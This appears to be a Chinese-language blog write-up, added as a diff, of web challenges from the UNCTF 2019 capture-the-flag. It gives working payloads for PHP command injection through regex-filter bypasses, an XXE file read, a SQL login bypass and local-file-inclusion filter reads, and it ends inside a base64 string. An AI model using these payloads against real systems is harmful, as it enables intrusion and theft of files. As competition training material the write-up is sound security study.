@@ -1,0 +1,1098 @@
+
+<!DOCTYPE html>
+<html lang class="loading">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>UNCTF Write Up - Knlvre</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="UNCTF时间：2019年10月22日 — 2019年10月27日
+因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写
+bypass
+考点：RCE（命令执行），PHP正则匹配反斜,"> 
+    <meta name="author" content="Knlvre"> 
+    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
+    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
+</head>
+</html>
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">Knlvre</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">UNCTF Write Up</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(http://pic.netbian.com/uploads/allimg/180417/160606-1523952366b027.jpg);">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                November 01, 2019
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/11/01/UNCTF Write Up/" title="UNCTF Write Up">UNCTF Write Up</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    37k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    34 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="UNCTF"><a href="#UNCTF" class="headerlink" title="UNCTF"></a>UNCTF</h1><p>时间：2019年10月22日 — 2019年10月27日</p>
+<p>因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写</p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><blockquote>
+<p>考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符</p>
+</blockquote>
+<p>开始做题前先清楚几个知识点：</p>
+<p><strong>① PHP正则匹配反斜杠的特点</strong></p>
+<p>在本题的<strong>preg_match()</strong>函数中，我们可以发现对<strong>反斜杠（\）</strong>的过滤使用的是<strong>\</strong>，但是这样写是不对的，正确写法是<strong>三个反斜杠（\\）</strong>。在 PHP 正则中，三个反斜杠才能匹配到真正意义上的一个<strong>字符反斜杠</strong></p>
+<p>因为在 PHP 代码中，PHP解释器本身会对反斜杠进行一次解释，而 正则函数 本身也会对反斜杠进行解释。并且，如果反斜杠后面的字符不需要转义，即反斜杠没有起转义作用时，它就会被当成普通字符串保留下来</p>
+<p>两个反斜杠</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# cat index.php 
+&lt;?php
+$a = $_GET[a];
+if(preg_match(&quot;/\\/&quot;,$a)){
+    echo &quot;NO&quot;;
+}else{
+    echo &quot;Yes&quot;;
+}
+?&gt;
+
+root@Knlvre:/var/www/html# curl &#39;http://127.0.0.1?a=\&#39;;
+Yes
+</code></pre>
+<p>PHP解释器完成第一次反斜杠解释，变为：<strong>preg_match(“/\/“,$a)</strong>，正则完成第二次反斜杠解释，变为：<strong>preg_match(“//“,$a)</strong></p>
+<p>Ps：等于说第二次解释反斜杠（正则完成的）的时候，反斜杠作用的目标是<strong>斜杠（/）</strong>，但是这没有意义，因为<strong>“/”</strong>本身就是没有其他作用的字符。preg_match中的第一个参数需要有一对任何非字母、数字、“\”或空格的字符作为分隔符，也就是我们最常用的“/” </p>
+<p>三个反斜杠</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# cat index.php 
+&lt;?php
+$a = $_GET[a];
+if(preg_match(&quot;/\\\/&quot;,$a)){
+    echo &quot;NO&quot;;
+}else{
+    echo &quot;Yes&quot;;
+}
+?&gt;
+root@Knlvre:/var/www/html# curl &#39;http://127.0.0.1?a=\&#39;;
+NO
+</code></pre>
+<p>PHP解释器完成第一次反斜杠解释，三个反斜杠中，第一个反斜杠解释第二个反斜杠，第三个反斜杠解释结尾的“/”，但是因为没有实际作用，所以它被保留下来，变为：<strong>preg_match(“/\/“,$a)</strong>，即原本第二个和第三个反斜杠被保留了</p>
+<p>正则完成第二次反斜杠解释，变为：<strong>preg_match(“/\/“,$a)</strong>，就刚好匹配反斜杠字符</p>
+<p><strong>② 文件通配符</strong></p>
+<p>Linux 的命令行中，是允许使用通配符的（<strong>?</strong>和<strong>*</strong>）</p>
+<p>生成 3 个测试文件</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# ls
+abc.txt  ab.txt  a.txt
+
+root@Knlvre:/var/www/html# cat a.txt 
+a
+
+root@Knlvre:/var/www/html# cat ab.txt 
+ab
+
+root@Knlvre:/var/www/html# cat abc.txt 
+abc
+</code></pre>
+<p><strong>“*”</strong>的使用</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# cat a*.txt
+abc
+ab
+a
+</code></pre>
+<p><strong>“?”</strong>的使用</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# cat ?.txt
+a
+
+root@Knlvre:/var/www/html# cat a?.txt
+ab
+root@Knlvre:/var/www/html# cat ??.txt
+ab
+
+root@Knlvre:/var/www/html# cat a??.txt
+abc
+root@Knlvre:/var/www/html# cat ???.txt
+abc
+</code></pre>
+<p>以上是对文件的匹配，但是当想要匹配的是命令时，则需要加上命令的<strong>二进制文件</strong>的位置，不然只会提示<strong>command not found</strong></p>
+<pre><code class="bash">root@Knlvre:/var/www/html# ca? a.txt
+bash: ca?: command not found
+
+root@Knlvre:/var/www/html# /bin/ca? abc.txt
+abc
+</code></pre>
+<p>还有一个骚操作可以代替通配符，就是<strong>中括号</strong></p>
+<pre><code class="bash">root@Knlvre:/var/www/html# /bin/[b-d]at abc.txt 
+abc
+
+root@Knlvre:/var/www/html# /bin/[a-z]at abc.txt 
+abc
+</code></pre>
+<p><strong>③ Linux 命令换行</strong></p>
+<p>在命令执行的过程中，在URL编码中<strong>%0a</strong>解释为换行符，而我们可以利用它们来执行多条命令（类似 &amp; 的作用）</p>
+<pre><code class="bah">root@Knlvre:/var/www/html# cat index.php 
+&lt;?php
+echo system($_GET[a]);
+?&gt;
+</code></pre>
+<p>可以看到分别执行了我们给的2个命令，并且都返回了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-1.png" alt="1-1"></p>
+<p><strong>④ Linux 命令终止符</strong></p>
+<p><strong>空格+#（URL编码为%20%23）</strong>在 Linux 命令行中为命令的终止符，类似注释符，我们可以利用这个闭合掉源码中的其他东西</p>
+<p>OK</p>
+<p>出题者对本题做过一次修改：未修改前的非预期解 以及 修改后的预期解，我们这里都看一下：</p>
+<p>① 未修改前</p>
+<p>题目源码</p>
+<pre><code class="php">&lt;?php
+    highlight_file(__FILE__);
+    $a = $_GET[&#39;a&#39;];
+    $b = $_GET[&#39;b&#39;];
+ // try bypass it
+    if (preg_match(&quot;/\&#39;|\&quot;|,|;|\\|\**|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
+        $a = &quot;&quot;;
+    $a =&#39;&quot;&#39; . $a . &#39;&quot;&#39;;
+    if (preg_match(&quot;/\&#39;|\&quot;|;|,|\**|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))
+        $b = &quot;&quot;;
+     $b = &#39;&quot;&#39; . $b . &#39;&quot;&#39;;
+     $cmd = &quot;file $a $b&quot;;
+     str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); 
+     system($cmd);
+?&gt;
+</code></pre>
+<p>对<strong>$a</strong>的<strong>$b</strong>的正则中，反斜杠的匹配都出了问题。而对 $a 的正则中：</p>
+<pre><code class="bash">\\|\**
+</code></pre>
+<p>PHP解释器先进行一次解释，变为</p>
+<pre><code class="bash">\|**
+</code></pre>
+<p>然后正则再解释一次，变为</p>
+<pre><code class="bash">|**
+</code></pre>
+<p>所以会导致实际匹配到的字符串为 <strong>“|</strong>”**。这时候反引号就逃逸出来了，可以直接强制地命令执行（尽管还有拼接到 file 命令后面）</p>
+<pre><code class="bash">?a=**uname**
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-2.png" alt="1-2"></p>
+<p>发现可以命令执行后，查看当前目录（因为<strong>ls</strong>命令被禁用，这里用<strong>dir</strong>）</p>
+<pre><code class="bash">?a=**dir .**
+
+?a=**dir ../../../**
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-3.png" alt="1-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-4.png" alt="1-4"></p>
+<p>但是都没有，所以直接用 find 命令找，但是也没有结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-5.png" alt="1-5"></p>
+<p>这题正确姿势是用<strong>grep -R</strong>来找，通过文件内容找 flag</p>
+<blockquote>
+<p>grep -R 参数可以从某个目录开始，递归地查找文件内容</p>
+</blockquote>
+<pre><code class="bash">http://183.129.189.60:10026/?a=**/bi?/gre? -R ctf**
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-6.png" alt="1-6"></p>
+<p>② 修改后</p>
+<p>出题人将<strong>\</strong>换到了<strong>*</strong>前面，其他没变</p>
+<pre><code class="php"> if (preg_match(&quot;/\&#39;|\&quot;|,|;|\**|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
+
+if (preg_match(&quot;/\&#39;|\&quot;|;|,|\**|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))
+</code></pre>
+<p>这个时候反引号就无法利用了。因为这里导致<strong>\n（换行符）</strong>逃逸，所以这里利用它，看着 payload 学习：</p>
+<pre><code class="bash">?a=\&amp;b=%0a/bi?/gre? -R ctf #
+</code></pre>
+<p>实际执行的语句就是</p>
+<pre><code class="bash">file &quot;\&quot; &quot;
+/bi?/gre? -R ctf #&quot;
+</code></pre>
+<p><strong>a=\</strong>是因为这个传入的反斜杠转义掉第二个<strong>双引号</strong>，才能是下面的 grep 命令正常执行</p>
+<pre><code class="bash">root@Knlvre:/var/www/html# file &quot;&quot;&quot;
+&gt; ^C
+
+root@Knlvre:/var/www/html# file &quot;\&quot;&quot;
+&quot;: cannot open **&quot;&#39; (No such file or directory)
+</code></pre>
+<p>而<strong>b</strong>的 空格+# 是为了注释掉最后面的双引号</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-7.png" alt="1-7"></p>
+<h2 id="Do-you-like-xml"><a href="#Do-you-like-xml" class="headerlink" title="Do you like xml?"></a>Do you like xml?</h2><blockquote>
+<p>考点：XXE</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-1.png" alt="2-1"></p>
+<p>看到<strong>flag in this pic</strong>，下载图片，<strong>winhex</strong>打开在中间发现<strong>flag in flag.php</strong>的字样</p>
+<p>抓包提交用户名和密码，发现可能有XXE</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-2.png" alt="2-2"></p>
+<p>测试 payload </p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE whatever[
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-3.png" alt="2-3"></p>
+<p>解码就是 flag</p>
+<h2 id="K-amp-K战队的老家"><a href="#K-amp-K战队的老家" class="headerlink" title="K&amp;K战队的老家"></a>K&amp;K战队的老家</h2><blockquote>
+<p>考点：LFI、万能密码</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-1.png" alt="3-1"></p>
+<p>密码爆破无结果，万能密码登陆成功（用浏览器输入会出错，burpsuit输入就可以）</p>
+<pre><code class="bash">1&#39; || &#39;1
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-2.png" alt="3-2"></p>
+<p>点击 俱乐部运维手册 会提示<strong>Identity problems, please relogin</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-3.png" alt="3-3"></p>
+<p>添加<strong>x-forwarded-for:127.0.0.1</strong>没用，应该要 cookie 了。尝试 URL 中的参数<strong>m</strong>，LFI payload</p>
+<pre><code class="bash">?m=php://filter/read=convert.base64-encode/resource=home.php
+</code></pre>
+<p>但是这里提示<strong>Illegal</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-4.png" alt="3-4"></p>
+<p>这说明这里还是有做过滤的，应该是有利用价值。过滤了<strong>php</strong>、<strong>base64</strong>，用大小写成功绕过</p>
+<p>这里直接写<strong>home</strong>而不是<strong>home.php</strong>是因为之前的<strong>?m=index</strong>和<strong>?m=debug</strong>也都没有加后缀，猜测可能后台会加上去</p>
+<pre><code class="bash">?m=php://filter/read=convert.base64-encode/resource=home
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-5.png" alt="3-5"></p>
+<p>解码之后拿到<strong>home.php</strong>的源码</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+include &quot;./inc/config.php&quot;;
+$mothed = $_GET[&quot;m&quot;] ? $_GET[&quot;m&quot;] : &quot;index&quot;;
+$cookie = $_COOKIE[&quot;identy&quot;];
+
+if($mothed == &quot;login&quot;) {
+
+    $username = $_POST[&quot;user&quot;];
+    $userpass = $_POST[&quot;pw&quot;];
+    if($username == &quot;&quot; || $userpass == &quot;&quot;) {
+        die(&#39;&lt;script&gt;alert(&quot;Account or password cannot be empty&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+    waf($username);
+    waf($userpass);
+    $db-&gt;user_check($username, $userpass, $session);
+
+}
+elseif($mothed == &quot;index&quot;) {
+    check($cookie, $db, $session);
+    echo_index();
+}
+elseif($mothed == &quot;logout&quot;) {
+    check($cookie, $db, $session);
+    setcookie(&quot;identy&quot;,&quot;&quot;);
+    die(&#39;&lt;script&gt;alert(&quot;Goodbye&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+}
+else {
+    mothed_waf($mothed);
+    $page = $mothed . &quot;.php&quot;;
+    include($page);
+    check($cookie, $db, $session);
+    $d = new debug($session, $d);
+    $d-&gt;vt($session, $d);
+    $d-&gt;debug($session);
+}
+?&gt;
+</code></pre>
+<p>前面 include 了 <strong>./inc/config.php</strong>，修改 payload 拿源码</p>
+<pre><code class="bash">?m=Php://filter/convert.Base64-encode/resource=./inc/config.php
+</code></pre>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+include &quot;session.php&quot;;
+//include &quot;access.php&quot;;
+include &quot;func.php&quot;;
+include &quot;db.php&quot;;
+$db = new db();
+$session = new session();
+?&gt;
+</code></pre>
+<p>同样方法拿<strong>session.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class session{
+    public $choose = 1;
+    public $id = 0;
+    public $username = &quot;&quot;;
+}
+?&gt;
+</code></pre>
+<p><strong>func.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+function waf($str) {
+    if(preg_match(&#39;/(and|or|if|select|union|sleep|order|group|by|exp|user|from|where|tables|substr|database|join|greatest|like|not|hex|bin|ascii|md5|benchmark|concat|mid|strcmp|left|right|replace|when|\/|=|&gt;|&lt;|\*|\(|\)|~|%|!|&amp;&amp;|,|&quot;|;|#|\^|-)/i&#39;, $str) == 1) {
+        die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+}
+function mothed_waf($str) {
+    if(preg_match(&#39;/(base64|php|write)/&#39;, $str) == 1) {
+        die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;);
+    }
+    if(preg_match(&#39;/(flag|access)/i&#39;, $str) == 1) {
+        die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;);
+    }
+}
+
+function cookie_decode($str) {
+    $data = urldecode($str);
+    $data = substr($data, 1);
+    $arr = explode(&#39;&amp;&#39;, $data);
+    $cipher = &#39;&#39;;
+    foreach($arr as $value) {
+        $num = hexdec($value);
+        $num = $num - 240;
+        $cipher = $cipher.&#39;%&#39;.dechex($num);
+    }
+    $key = urldecode($cipher);
+    $key = base64_decode($key);
+    return $key;
+}
+
+function cookie_encode($str) {
+    $key = base64_encode($str);
+    $key = bin2hex($key);
+    $arr = str_split($key, 2);
+    $cipher = &#39;&#39;;
+    foreach($arr as $value) {
+        $num = hexdec($value);
+        $num = $num + 240;
+        $cipher = $cipher.&#39;&amp;&#39;.dechex($num);
+    }
+    return $cipher;
+}
+
+function check($str, $db, &amp;$session) {
+    if($str == &quot;&quot;) {
+        die(&#39;&lt;script&gt;alert(&quot;Please login again&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+    $objstr = cookie_decode($str);
+    try {
+        $session = unserialize($objstr);
+        $session-&gt;id = intval($session-&gt;id);
+        waf($session-&gt;username);
+
+
+    } catch(Exception $e) {
+        die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+    $db-&gt;index_check($session-&gt;id, $session-&gt;username);
+
+}
+
+function check1($obj) {
+    if($obj-&gt;username !== &quot;debuger&quot;) {
+        setcookie(&quot;identy&quot;, &quot;&quot;);
+        die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+}
+
+function echo_index() {
+    echo base64_decode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KICAgIAogICAgPHRpdGxlPmhvbWU8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtc3RhdHVzLWJhci1zdHlsZSIgY29udGVudD0iYmxhY2siPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtY2FwYWJsZSIgY29udGVudD0ieWVzIj4KICAgIDxtZXRhIG5hbWU9ImZvcm1hdC1kZXRlY3Rpb24iIGNvbnRlbnQ9InRlbGVwaG9uZT1ubyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4vaG9tZV9maWxlcy9sYXl1aS5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL2hvbWVfZmlsZXMvZ2xvYmFsLmNzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0icHJlbG9hZCIgaHJlZj0iLi9ob21lX2ZpbGVzL2YoMSkudHh0IiBhcz0ic2NyaXB0Ij48bGluayByZWw9InByZWxvYWQiIGhyZWY9Ii4vaG9tZV9maWxlcy9mLnR4dCIgYXM9InNjcmlwdCI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi9ob21lX2ZpbGVzL2YudHh0Ij48L3NjcmlwdD48L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImxheXVpLWxheW91dCBsYXl1aS1sYXlvdXQtYWRtaW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWhlYWRlciBoZWFkZXIgaGVhZGVyLWRlbW8iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1tYWluIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsb2dvIiBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPgogICAgICA8aW1nIHNyYz0iLi9ob21lX2ZpbGVzL2xvZ28ucG5nIj4KICAgIDwvYT4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLWhpZGUteHMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209bG9nb3V0Ij7pgIDlh7rnmbvlvZU8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtYmFyIiBzdHlsZT0ibGVmdDogNThweDsgdG9wOiA1NXB4OyB3aWR0aDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLXNpZGUgbGF5dWktYmctYmxhY2siPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1zaWRlLXNjcm9sbCI+CiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9ImxheXVpLW5hdiBsYXl1aS1uYXYtdHJlZSBzaXRlLWRlbW8tbmF2IiBsYXktZmlsdGVyPSJkZW1vIj4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLW5hdi1pdGVtZWQiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iamF2YXNjcmlwdDo7IiBocmVmPSJqYXZhc2NyaXB0OjsiPui1m+ajjeenmOexjTxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtbW9yZSI+PC9zcGFuPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGRsIGNsYXNzPSJsYXl1aS1uYXYtY2hpbGQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii4vaG9tZS5waHA/bT1pbmRleCI+5biI5YKF5Lus55qE5paH56ugPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPkNURueahOiHquaIkeS/ruWFuzwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLi9ob21lLnBocD9tPWRlYnVnIj7kv7HkuZDpg6jov5Dnu7TmiYvlhow8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L2RsPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImxheXVpLW5hdi1iYXIiIHN0eWxlPSJ0b3A6IDUxNy41cHg7IGhlaWdodDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWJvZHkgc2l0ZS1kZW1vIj4KICAgICAgICAgIDxpbWcgc3JjPSIuL2hvbWVfZmlsZXMv6KeG5Zu+LnBuZyI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibGF5dWktZm9vdGVyIGZvb3RlciBmb290ZXItZGVtbyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLW1haW4iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2YoMSkudHh0Ij48L3NjcmlwdD48c2NyaXB0IGFzeW5jPSIiIHNyYz0iLi9ob21lX2ZpbGVzL2Fkc2J5Z29vZ2xlLmpzIj48L3NjcmlwdD4KICAgICAgICA8ZGl2IGNsYXNzPSJzaXRlLXRyZWUtbW9iaWxlIGxheXVpLWhpZGUiPgogICAgICAgICAgICA8aSBjbGFzcz0ibGF5dWktaWNvbiI+7piCPC9pPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLXNoYWRlIj48L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2xheXVpLmpzIiBjaGFyc2V0PSJ1dGYtOCI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmF